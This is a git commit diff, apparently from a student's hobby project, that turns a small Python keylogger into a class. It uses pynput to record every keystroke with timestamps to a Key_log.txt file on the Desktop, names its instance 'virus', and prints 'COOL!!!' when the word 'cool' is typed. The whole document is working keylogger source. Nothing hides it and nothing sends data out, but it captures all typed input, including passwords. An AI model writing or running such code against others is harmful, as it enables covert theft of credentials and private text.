2b537836cddd6718280b3d62be028ab218e9a38f
Danfeng "Danny" Wang <dannywang@utexas.edu>
2018-10-16 20:58:10 -0500

    newKeylogger can check 'cool' now

--- newKeylogger.py
+++ newKeylogger.py
@@ -1,15 +1,40 @@
 from pynput.keyboard import Key, Listener
 import logging, os
 
-#log_dir = os.path.expanduser('~/Desktop')
-log_dir = ''
 
-logging.basicConfig(filename=(log_dir + 'Key_log.txt'),
-                    level=logging.DEBUG,
-                    format='%(asctime)s: %(message)s')
+class KeyLogger:
+    def __init__(self):
+        self.log_dir = os.path.expanduser('~/Desktop')
 
-def on_press(key):
-    logging.info(key)
+        logging.basicConfig(filename=(self.log_dir + '\Key_log.txt'),
+                            level=logging.DEBUG,
+                            format='%(asctime)s: %(message)s')
 
-with Listener(on_press=on_press) as listener:
-    listener.join()
+        self.coolList = [0, 0, 0, 0]
+
+    def on_press(self, key):
+        logging.info(key)
+        self.coolList.pop(0)
+        self.coolList.append(str(key))
+        self.check()
+
+    def run(self):
+        with Listener(on_press=self.on_press) as listener:
+            listener.join()
+
+    def check(self):
+        #print(self.coolList)
+        b = ["'c'", "'o'", "'o'", "'l'"]
+        #print(type(self.coolList[0]))
+        if self.coolList == b:
+            print('COOL!!!')
+
+
+
+
+def main():
+    virus = KeyLogger()
+    virus.run()
+
+if __name__ == '__main__':
+    main()
